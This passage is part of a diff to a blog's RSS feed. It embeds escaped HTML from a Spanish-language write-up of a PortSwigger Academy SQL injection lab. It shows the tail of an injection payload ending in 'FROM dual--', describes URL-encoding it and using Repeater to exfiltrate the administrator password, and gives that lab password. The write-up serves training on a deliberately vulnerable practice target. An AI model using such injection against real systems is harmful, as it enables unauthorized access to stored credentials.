class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) FROM dual--
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Claramente este codigo debemos convertirlo en formato URL para que no entre en conflicto con el header que es enviado. Para quedarmente enviado y ejecutado de esta manera.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 140; 
+			flex-basis: 338px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/repeater.png&#34; data-size=&#34;1546x1097&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/repeater.png&#34;
+			width=&#34;1546&#34;
+			height=&#34;1097&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/repeater_hu6e396335c4c9a3008f18d7243f6688e9_158621_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/repeater_hu6e396335c4c9a3008f18d7243f6688e9_158621_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion enviada con repeater para exfiltrar la contrasena&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion enviada con repeater para exfiltrar la contrasena&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Ahora solo queda iniciar sesion con la contrasena de administrator qu es &lt;code&gt;54m0mxu0yem302cyqm60&lt;/code&gt;.Y con esto hemos resulto el lab:&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 196; 
+			flex-basis: 471px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/resuelto.png&#34; data-size=&#34;1780x906&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/resuelto.png&#34;
+			width=&#34;1780&#34;
+			height=&#34;906&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/resuelto_hu07931e63497d5aea473f97c5614a0e07_96835_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/resuelto_hu07931e63497d5aea473f97c5614a0e07_96835_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
         <title>Portswigger Academy Learning Path: SQL Injection Lab 13</title>
         <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/</link>
         <pubDate>Mon, 08 Nov 2021 00:00:00 +0000</pubDate>
